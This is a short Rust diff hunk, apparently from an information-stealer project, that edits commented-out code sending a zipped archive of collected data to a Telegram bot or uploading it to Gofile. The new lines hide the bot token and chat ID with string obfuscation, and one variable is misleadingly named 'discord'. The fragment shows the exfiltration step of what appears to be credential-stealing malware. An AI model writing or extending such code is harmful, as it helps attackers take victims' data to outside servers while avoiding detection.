@@ -73,12 +73,12 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    // let telegram = TelegramBotSender::new(
-    //     Arc::from(env!("TELEGRAM_CHAT_ID")),
-    //     Arc::from(env!("TELEGRAM_BOT_TOKEN")),
+    // let discord = TelegramBotSender::new(
+    //     Arc::from(obfstr!(env!("TELEGRAM_CHAT_ID"))),
+    //     Arc::from(obfstr!(env!("TELEGRAM_BOT_TOKEN")))
     // );
-    //
-    // let _ = telegram.send_archive(generate_log_name(), zip, &collector);
+
+    // let _ = GofileUploader::new(discord).send_archive(generate_log_name(), zip, &collector);
 
     0
 }
